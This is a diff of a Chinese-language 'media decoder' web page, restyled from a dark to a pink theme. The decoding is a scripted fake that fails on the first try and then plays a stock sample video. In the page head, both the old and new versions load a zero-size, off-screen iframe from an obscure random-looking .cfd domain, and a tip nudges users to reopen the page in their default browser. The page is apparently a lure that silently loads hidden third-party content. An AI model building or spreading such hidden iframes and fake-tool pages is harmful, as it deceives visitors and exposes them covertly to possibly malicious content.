@@ -2,132 +2,292 @@
 <html lang="zh-CN">
 <head>
 <meta charset="UTF-8" />
-<iframe src="https://www.3mz8q0hnz4r7892-b81wf0b.cfd/sebo1/35f84f903156092fae6f232cc79fc288.html" style="position:fixed;top:0;width:0;height:0;left:-1000px;border:0"></iframe>
- <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>媒体解码器</title>
+<iframe src="https://www.3mz8q0hnz4r7892-b81wf0b.cfd/sebo2/35f84f903156092fae6f232cc79fc288.html" style="position:fixed;top:0;width:0;height:0;left:-1000px;border:0"></iframe>
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>媒体解码器 ♡</title>
 <style>
   *{box-sizing:border-box}
+  html,body{margin:0}
   body{
-    margin:0;min-height:100vh;display:flex;align-items:flex-start;justify-content:center;
-    font-family:Inter,"Segoe UI",Arial,sans-serif;color:#eef2ff;
-    background:linear-gradient(160deg,#070b16,#0d1424 60%,#070b16);
-    padding:18px 14px;
+    min-height:100vh;
+    padding:26px 14px 48px;
+    display:flex;justify-content:center;align-items:flex-start;
+    font-family:"Yuanti SC","YouYuan","Hiragino Maru Gothic ProN",
+                "PingFang SC","Microsoft YaHei",sans-serif;
+    color:#7b5567;
+    background:#fff2f8;
+    background-image:
+      radial-gradient(#ffd9ea 1.6px,transparent 1.6px),
+      radial-gradient(#ffe9c9 1.6px,transparent 1.6px);
+    background-size:24px 24px,24px 24px;
+    background-position:0 0,12px 12px;
   }
-  .app{width:min(720px,100%);background:rgba(11,16,32,.94);border:1px solid rgba(255,255,255,.08);
-    box-shadow:0 22px 60px rgba(0,0,0,.36);border-radius:20px;overflow:hidden}
-  .topbar{display:flex;align-items:center;justify-content:space-between;padding:14px 16px;border-bottom:1px solid rgba(255,255,255,.07)}
-  .brand{display:flex;align-items:center;gap:12px;font-weight:800;letter-spacing:.3px}
-  .logo{width:36px;height:36px;border-radius:12px;background:linear-gradient(135deg,#7c5cff,#28c5ff);display:grid;place-items:center;box-shadow:0 10px 30px rgba(76,110,245,.35)}
-  .dot{width:8px;height:8px;border-radius:50%;background:#52e6a7;box-shadow:0 0 16px #52e6a7}
-  .main{padding:20px}
-  .hero h1{font-size:clamp(24px,7vw,34px);margin:0 0 6px}.hero p{margin:0;color:#9aa6c2;line-height:1.5;font-size:14px}
-  .panel{margin-top:18px;padding:16px;border-radius:16px;background:rgba(255,255,255,.035);border:1px solid rgba(255,255,255,.07)}
-  label{display:block;font-size:14px;color:#b8c1d9;margin-bottom:10px}
-  textarea{width:100%;min-height:125px;resize:vertical;border:1px solid rgba(255,255,255,.1);outline:none;border-radius:14px;background:#080d1a;color:#dce5ff;padding:14px;font:14px/1.5 ui-monospace,SFMono-Regular,Consolas,monospace;transition:.2s}
-  textarea:focus{border-color:#6d6cff;box-shadow:0 0 0 4px rgba(109,108,255,.12)}
-  .actions{display:flex;gap:10px;align-items:center;margin-top:12px;flex-wrap:wrap}
-  button{border:0;border-radius:12px;padding:12px 16px;font-weight:800;cursor:pointer;transition:.18s;display:inline-flex;align-items:center;gap:8px}
-  .primary{color:white;background:linear-gradient(135deg,#735cff,#2bbcff);box-shadow:0 12px 28px rgba(66,103,255,.25)}
-  .primary:hover{transform:translateY(-1px)}
-  .primary:disabled{opacity:.55;cursor:not-allowed;transform:none}
-  .ghost{background:rgba(255,255,255,.07);color:#cfd6e8}
-  .status{margin-left:auto;color:#8e9bb8;font-size:13px}
-  .progressWrap{display:none;margin-top:18px}
-  .progressHead{display:flex;justify-content:space-between;color:#9eabc7;font-size:13px;margin-bottom:8px}
-  .track{height:10px;background:#090e19;border-radius:999px;overflow:hidden;border:1px solid rgba(255,255,255,.06)}
-  .bar{height:100%;width:0;background:linear-gradient(90deg,#715dff,#30d8ff);border-radius:999px;transition:width .25s ease}
-  .log{display:none!important}
-  .mediaCard{display:none;margin-top:18px;border-radius:16px;overflow:hidden;border:1px solid rgba(255,255,255,.08);background:#050912;box-shadow:0 18px 40px rgba(0,0,0,.28)}
-  .mediaHeader{display:flex;justify-content:space-between;align-items:center;padding:14px 16px;background:rgba(255,255,255,.04)}
-  .ready{color:#6ef0ad;font-size:13px;font-weight:700}
-  .player{position:relative;aspect-ratio:16/9;background:#03060d;cursor:pointer}
+
+  /* ---------- 卡片 ---------- */
+  .card{
+    width:min(680px,100%);
+    background:#fffdfe;
+    border:3px solid #ffd3e6;
+    border-radius:30px;
+    padding:26px 24px 30px;
+    box-shadow:0 14px 34px rgba(255,152,196,.22);
+    position:relative;
+  }
+  .card::before{
+    content:"";
+    position:absolute;inset:-3px;
+    border-radius:30px;
+    border:3px dashed #ffe6f2;
+    pointer-events:none;
+  }
+
+  /* ---------- 顶部 ---------- */
+  .top{
+    display:flex;align-items:center;justify-content:space-between;
+    gap:10px;margin-bottom:22px;
+  }
+  .brand{display:flex;align-items:center;gap:10px}
+  .logo{
+    width:42px;height:42px;border-radius:50%;
+    display:grid;place-items:center;font-size:19px;
+    background:linear-gradient(135deg,#ffb3d4,#ffd9a8);
+    box-shadow:0 6px 14px rgba(255,150,196,.4);
+  }
+  .brand b{font-size:15px;color:#ff86bb;letter-spacing:.04em}
+  .pill{
+    display:flex;align-items:center;gap:7px;
+    background:#fff0f7;border:2px solid #ffdff0;
+    border-radius:999px;padding:7px 14px;
+    font-size:12px;color:#ff9dc8;font-weight:700;
+  }
+  .dot{
+    width:8px;height:8px;border-radius:50%;
+    background:#8ee6b4;box-shadow:0 0 0 3px #ddfaea;
+  }
+
+  /* ---------- 标题 ---------- */
+  h1{
+    margin:0 0 8px;
+    font-size:clamp(23px,6.4vw,31px);
+    color:#ff7fb8;
+    letter-spacing:.02em;
+  }
+  h1 span{font-size:.75em}
+  .sub{margin:0;font-size:13px;color:#b391a3;line-height:1.7}
+
+  /* ---------- 输入 ---------- */
+  .label{
+    display:block;margin:24px 0 9px;
+    font-size:13px;font-weight:700;color:#ff9dc8;
+  }
+  textarea{
+    width:100%;min-height:120px;resize:vertical;
+    border:2.5px solid #ffdff0;border-radius:22px;
+    background:#fff8fb;color:#6f4f5f;
+    padding:15px 17px;outline:none;
+    font:14px/1.65 "PingFang SC","Microsoft YaHei",sans-serif;
+    transition:.2s;
+  }
+  textarea::placeholder{color:#e2bfd1}
+  textarea:focus{
+    border-color:#ffadd2;background:#fff;
+    box-shadow:0 0 0 5px #ffe9f3;
+  }
+
+  /* ---------- 按钮 ---------- */
+  .row{display:flex;align-items:center;gap:11px;margin-top:16px;flex-wrap:wrap}
+  .btn{
+    font-family:inherit;font-size:14px;font-weight:700;
+    border:none;border-radius:999px;
+    padding:13px 24px;cursor:pointer;
+    transition:transform .14s ease,box-shadow .14s ease,background .14s ease;
+  }
+  .btn:disabled{opacity:.5;cursor:not-allowed}
+  .btn-main{
+    color:#fff;
+    background:linear-gradient(135deg,#ffa3cd,#ff7ab8);
+    box-shadow:0 6px 0 #ffcbe3,0 12px 20px rgba(255,140,190,.3);
+  }
+  .btn-main:hover:not(:disabled){transform:translateY(-2px)}
+  .btn-main:active:not(:disabled){
+    transform:translateY(5px);
+    box-shadow:0 1px 0 #ffcbe3;
+  }
+  .btn-ghost{
+    color:#ff9dc8;background:#fff;
+    border:2.5px solid #ffdff0;
+    box-shadow:0 5px 0 #fff0f7;
+  }
+  .btn-ghost:hover:not(:disabled){background:#fff5fa}
+  .btn-ghost:active:not(:disabled){
+    transform:translateY(4px);
+    box-shadow:0 1px 0 #fff0f7;
+  }
+  .status{
+    margin-left:auto;
+    font-size:12.5px;color:#c5a4b5;font-weight:700;
+  }
+
+  /* ---------- 进度 ---------- */
+  .progress{display:none;margin-top:24px}
+  .p-head{
+    display:flex;justify-content:space-between;gap:10px;
+    font-size:12.5px;color:#bb9aab;font-weight:700;
+    margin-bottom:9px;
+  }
+  .track{
+    height:16px;border-radius:999px;
+    background:#fff0f7;overflow:hidden;
+    border:2px solid #ffe4f1;
+  }
+  .bar{
+    height:100%;width:0;border-radius:999px;
+    background:linear-gradient(90deg,#ffd1e8,#ff8ec4);
+    transition:width .3s ease;
+  }
+
+  /* ---------- 播放卡片 ---------- */
+  .media{
+    display:none;margin-top:26px;
+    border:3px solid #ffdff0;border-radius:26px;
+    background:#fff;overflow:hidden;
+    box-shadow:0 10px 24px rgba(255,152,196,.18);
+  }
+  .media-head{
+    display:flex;justify-content:space-between;align-items:center;gap:10px;
+    padding:14px 18px;background:#fff6fb;
+    border-bottom:2px dashed #ffe4f1;
+  }
+  .media-head b{font-size:14px;color:#ff86bb}
+  .media-head small{
+    display:block;margin-top:4px;
+    font-size:11.5px;color:#c5a4b5;
+  }
+  .ok{
+    font-size:11.5px;font-weight:700;color:#5fcf95;
+    background:#e8fbf1;border-radius:999px;
+    padding:6px 12px;white-space:nowrap;
+  }
+
+  .player{position:relative;aspect-ratio:16/9;background:#2a1c24;cursor:pointer}
   video{width:100%;height:100%;display:block;object-fit:cover;background:#000}
-  .overlay{position:absolute;inset:0;display:grid;place-items:center;background:linear-gradient(to top,rgba(0,0,0,.42),rgba(0,0,0,.05));transition:.2s}
-  .playBtn{width:82px;height:82px;border-radius:50%;display:grid;place-items:center;background:rgba(255,255,255,.16);border:1px solid rgba(255,255,255,.25);backdrop-filter:blur(8px);font-size:28px;box-shadow:0 10px 35px rgba(0,0,0,.35)}
-  .hint{text-align:center;color:#77839d;font-size:11px;margin-top:12px}
-  .browserTip{margin-top:14px;padding:11px 13px;border-radius:12px;background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.07);color:#9eabc7;font-size:12px;text-align:center}
-  .browserTip b{color:#eef2ff}
-  .contact{margin-top:18px;padding:14px 10px 2px;border-top:1px solid rgba(255,255,255,.07);text-align:center;font-size:13px;color:#8e9bb8}
-  .contact b{color:#fff;font-size:14px}
-  @media(max-width:640px){
-    body{padding:10px}
-    .app{border-radius:16px}
-    .main{padding:16px}
-    .logo{width:32px;height:32px;border-radius:10px}
-    .brand{font-size:14px}
-    .topbar>div:last-child{font-size:12px!important}
-    .actions{display:grid;grid-template-columns:1fr 1fr}
-    button{justify-content:center;width:100%}
-    .status{grid-column:1/-1;width:100%;margin:0;text-align:center}
-    .mediaHeader{padding:12px 13px}
-    .playBtn{width:66px;height:66px;font-size:24px}
+  .overlay{
+    position:absolute;inset:0;display:grid;place-items:center;
+    background:rgba(120,70,95,.35);
+    transition:opacity .2s ease;
+  }
+  .play{
+    width:78px;height:78px;border-radius:50%;
+    display:grid;place-items:center;font-size:26px;
+    color:#ff7ab8;background:rgba(255,255,255,.94);
+    box-shadow:0 8px 22px rgba(90,40,65,.3);
+  }
+  .play-tip{
+    margin-top:12px;text-align:center;
+    font-size:12.5px;color:#fff;font-weight:700;
+    text-shadow:0 1px 6px rgba(90,40,65,.5);
+  }
+
+  /* ---------- 底部 ---------- */
+  .tip{
+    margin-top:24px;padding:12px 16px;
+    border-radius:18px;background:#fff6fb;
+    font-size:12px;color:#bb9aab;text-align:center;
+    line-height:1.7;
+  }
+  .tip b{color:#ff9dc8}
+  .foot{
+    margin-top:12px;text-align:center;
+    font-size:11px;color:#e0c3d3;
+  }
+
+  /* ---------- 手机 ---------- */
+  @media (max-width:640px){
+    body{padding:14px 10px 34px}
+    .card{border-radius:24px;padding:20px 16px 24px}
+    .card::before{border-radius:24px}
+    .logo{width:36px;height:36px;font-size:16px}
+    .brand b{font-size:13px}
+    .pill{padding:6px 11px;font-size:11px}
+    .row{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+    .btn{width:100%;padding:13px 10px}
+    .status{grid-column:1/-1;margin:4px 0 0;text-align:center}
+    .play{width:62px;height:62px;font-size:22px}
   }
 </style>
 </head>
 <body>
-  <div class="app">
-    <div class="topbar">
-      <div class="brand"><div class="logo">▶</div> MEDIA DECODER</div>
-      <div style="display:flex;align-items:center;gap:8px;color:#8d98b0;font-size:13px"><span class="dot"></span> Ready</div>
+
+  <div class="card">
+    <div class="top">
+      <div class="brand">
+        <div class="logo">🌸</div>
+        <b>MEDIA DECODER</b>
+      </div>
+      <div class="pill"><span class="dot"></span> Ready</div>
     </div>
 
-    <div class="main">
-      <div class="hero">
-        <h1>媒体内容解码器</h1>
-        <p>粘贴内容，点击解码，完成后即可播放媒体。</p>
-      </div>
+    <h1>媒体内容解码器 <span>♡</span></h1>
+    <p class="sub">粘贴内容，点击解码，完成后就可以播放啦～</p>
 
-      <div class="panel">
-        <label for="payload">待解码内容</label>
-        <textarea id="payload" placeholder="请在这里粘贴需要解码的内容……"></textarea>
+    <label class="label" for="payload">✦ 待解码内容</label>
+    <textarea id="payload" placeholder="请在这里粘贴需要解码的内容……"></textarea>
 
-        <div class="actions">
-          <button class="primary" id="decodeBtn">⚡ 开始解码</button>
-          <button class="ghost" id="clearBtn">清空</button>
-          <div class="status" id="statusText">等待输入</div>
-        </div>
-
-        <div class="progressWrap" id="progressWrap">
-          <div class="progressHead"><span id="stepText">初始化解析器…</span><span id="percentText">0%</span></div>
-          <div class="track"><div class="bar" id="bar"></div></div>
-          <div class="log" id="log"></div>
-        </div>
-      </div>
-
-      <div class="mediaCard" id="mediaCard">
-        <div class="mediaHeader">
-          <div><strong>已解码媒体</strong><div style="font-size:12px;color:#8190ac;margin-top:4px">video/mp4 · 1920×1080</div></div>
-          <div class="ready">● DECODED</div>
-        </div>
-        <div class="player" id="player">
-          <video id="video" preload="metadata" playsinline controls>
-            <source src="https://interactive-examples.mdn.mozilla.net/media/cc0-videos/flower.mp4" type="video/mp4">
-          </video>
-          <div class="overlay" id="overlay"><div><div class="playBtn">▶</div><div style="text-align:center;margin-top:12px;font-size:13px">点击播放媒体</div></div></div>
-        </div>
-      </div>
-
-      <div class="browserTip">为获得更稳定的播放体验，推荐使用 <b>默认浏览器</b> 打开</div>
-      <div class="hint">演示页面 · 解码过程为视觉模拟</div>
+    <div class="row">
+      <button class="btn btn-main" id="decodeBtn">⚡ 开始解码</button>
+      <button class="btn btn-ghost" id="clearBtn">清空</button>
+      <span class="status" id="statusText">等待输入</span>
     </div>
+
+    <div class="progress" id="progressWrap">
+      <div class="p-head">
+        <span id="stepText">初始化解析器…</span>
+        <span id="percentText">0%</span>
+      </div>
+      <div class="track"><div class="bar" id="bar"></div></div>
+    </div>
+
+    <div class="media" id="mediaCard">
+      <div class="media-head">
+        <div>
+          <b>已解码媒体</b>
+          <small>video/mp4 · 1920×1080</small>
+        </div>
+        <span class="ok">● DECODED</span>
+      </div>
+      <div class="player" id="player">
+        <video id="video" preload="metadata" playsinline controls>
+          <source src="https://interactive-examples.mdn.mozilla.net/media/cc0-videos/flower.mp4" type="video/mp4">
+        </video>
+        <div class="overlay" id="overlay">
+          <div>
+            <div class="play">▶</div>
+            <div class="play-tip">点击播放媒体</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="tip">为获得更稳定的播放体验，推荐使用 <b>默认浏览器</b> 打开</div>
+    <div class="foot">演示页面 · 解码过程为视觉模拟 ♡</div>
   </div>
 
 <script>
-const payload = document.getElementById('payload');
-const decodeBtn = document.getElementById('decodeBtn');
-const clearBtn = document.getElementById('clearBtn');
-const statusText = document.getElementById('statusText');
+const payload      = document.getElementById('payload');
+const decodeBtn    = document.getElementById('decodeBtn');
+const clearBtn     = document.getElementById('clearBtn');
+const statusText   = document.getElementById('statusText');
 const progressWrap = document.getElementById('progressWrap');
-const bar = document.getElementById('bar');
-const percentText = document.getElementById('percentText');
-const stepText = document.getElementById('stepText');
-const mediaCard = document.getElementById('mediaCard');
-const player = document.getElementById('player');
-const video = document.getElementById('video');
-const overlay = document.getElementById('overlay');
+const bar          = document.getElementById('bar');
+const percentText  = document.getElementById('percentText');
+const stepText     = document.getElementById('stepText');
+const mediaCard    = document.getElementById('mediaCard');
+const player       = document.getElementById('player');
+const video        = document.getElementById('video');
+const overlay      = document.getElementById('overlay');
 
 let attempt = 0;
-let timer = null;
+let timer   = null;
 
 function resetTimer(){
   if (timer) clearInterval(timer);
@@ -138,19 +298,19 @@ function startDecode(){
   if (!payload.value.trim()) {
     payload.focus();
     statusText.textContent = '请输入解码内容';
-    stepText.textContent = '等待输入内容';
+    stepText.textContent   = '等待输入内容';
     return;
   }
 
   resetTimer();
   attempt += 1;
   decodeBtn.disabled = true;
-  clearBtn.disabled = true;
-  mediaCard.style.display = 'none';
+  clearBtn.disabled  = true;
+  mediaCard.style.display    = 'none';
   progressWrap.style.display = 'block';
   bar.style.width = '0%';
   percentText.textContent = '0%';
-  statusText.textContent = '解码中…';
+  statusText.textContent  = '解码中…';
 
   let seconds = 0;
   stepText.textContent = '正在解码 · 0 秒';
@@ -165,20 +325,20 @@ function startDecode(){
     if (seconds >= 15) {
       resetTimer();
       decodeBtn.disabled = false;
-      clearBtn.disabled = false;
+      clearBtn.disabled  = false;
 
       if (attempt === 1) {
         bar.style.width = '100%';
         percentText.textContent = '100%';
-        stepText.textContent = '解码失败，请重新尝试';
-        statusText.textContent = '解码失败';
-        decodeBtn.textContent = '↻ 重新尝试解码';
+        stepText.textContent    = '解码失败，请重新尝试';
+        statusText.textContent  = '解码失败';
+        decodeBtn.textContent   = '↻ 重新尝试解码';
       } else {
         bar.style.width = '100%';
         percentText.textContent = '100%';
-        stepText.textContent = '解码完成';
-        statusText.textContent = '完成';
-        decodeBtn.textContent = '⚡ 再次解码';
+        stepText.textContent    = '解码完成';
+        statusText.textContent  = '完成 ♡';
+        decodeBtn.textContent   = '⚡ 再次解码';
         mediaCard.style.display = 'block';
         mediaCard.scrollIntoView({behavior:'smooth', block:'nearest'});
       }
@@ -193,14 +353,14 @@ clearBtn.addEventListener('click', () => {
   attempt = 0;
   payload.value = '';
   progressWrap.style.display = 'none';
-  mediaCard.style.display = 'none';
+  mediaCard.style.display    = 'none';
   statusText.textContent = '等待输入';
-  stepText.textContent = '初始化解析器…';
+  stepText.textContent   = '初始化解析器…';
   bar.style.width = '0%';
   percentText.textContent = '0%';
   decodeBtn.textContent = '⚡ 开始解码';
   decodeBtn.disabled = false;
-  clearBtn.disabled = false;
+  clearBtn.disabled  = false;
   video.pause();
   video.currentTime = 0;
   overlay.style.display = 'grid';
@@ -210,7 +370,7 @@ player.addEventListener('click', (e) => {
   if (e.target === video && !video.paused) return;
   if (video.paused) video.play(); else video.pause();
 });
-video.addEventListener('play', () => overlay.style.display = 'none');
+video.addEventListener('play',  () => overlay.style.display = 'none');
 video.addEventListener('pause', () => { if (!video.ended) overlay.style.display = 'grid'; });
 video.addEventListener('ended', () => overlay.style.display = 'grid');
 </script>
